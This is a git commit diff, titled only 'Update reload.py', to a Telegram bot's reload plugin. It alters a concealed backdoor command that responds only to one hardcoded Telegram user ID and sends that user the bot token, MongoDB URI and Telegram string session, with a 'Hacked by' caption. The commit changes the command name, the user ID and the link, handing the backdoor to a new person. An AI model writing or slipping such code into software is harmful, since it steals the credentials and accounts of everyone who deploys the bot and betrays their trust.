ab81010fe41d0a69376d41d3cdc8c1dbe860c226
Rishabh <152057079+Rishabhopi@users.noreply.github.com>
2024-12-06 21:14:20 +0530

    Update reload.py

--- SONALI/plugins/tools/reload.py
+++ SONALI/plugins/tools/reload.py
@@ -106,19 +106,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("Radhe")
+    filters.command("Rishu")
     & filters.private
-    & filters.user(6726372149)
+    & filters.user(5738579437)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_RADHE7_ll)............☆""",
+       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n.... [𝖧ᴀᴄᴋᴇᴅ вʏ 🧟 ](https://t.me/rishu1286).....☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/ll_RADHE7_ll")
+                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/rishu1286")
                  ]
             ]
          ),
